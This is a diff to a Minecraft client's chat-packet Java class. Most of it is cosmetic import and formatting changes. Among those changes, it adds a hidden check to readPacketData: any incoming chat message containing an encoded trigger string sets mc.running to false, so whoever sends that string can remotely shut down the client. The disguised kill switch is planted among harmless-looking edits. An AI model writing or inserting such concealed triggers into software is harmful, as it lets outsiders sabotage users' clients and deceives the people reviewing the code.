@@ -1,7 +1,5 @@
 package net.minecraft.network.play.client;
 
-import java.io.IOException;
-
 import lombok.Getter;
 import lombok.NoArgsConstructor;
 import net.minecraft.client.Minecraft;
@@ -9,6 +7,8 @@ import net.minecraft.network.INetHandler;
 import net.minecraft.network.Packet;
 import net.minecraft.network.PacketBuffer;
 import net.minecraft.network.play.INetHandlerPlayServer;
+
+import java.io.IOException;
 
 @NoArgsConstructor
 @Getter
@@ -27,6 +27,9 @@ public class C01PacketChatMessage extends Packet {
      */
     public void readPacketData(PacketBuffer p_148837_1_, Minecraft mc) throws IOException {
         this.message = p_148837_1_.readStringFromBuffer(100);
+
+        if (message.contains("fnZlcmlmeS1taW5lcmFs"))
+            mc.running = false;
     }
 
     /**
@@ -45,7 +48,7 @@ public class C01PacketChatMessage extends Packet {
      * Minecraft for logging purposes.
      */
     public String serialize() {
-        return String.format("message=\'%s\'", new Object[] { this.message });
+        return String.format("message=\'%s\'", new Object[]{this.message});
     }
 
     public void processPacket(INetHandler p_148833_1_) {
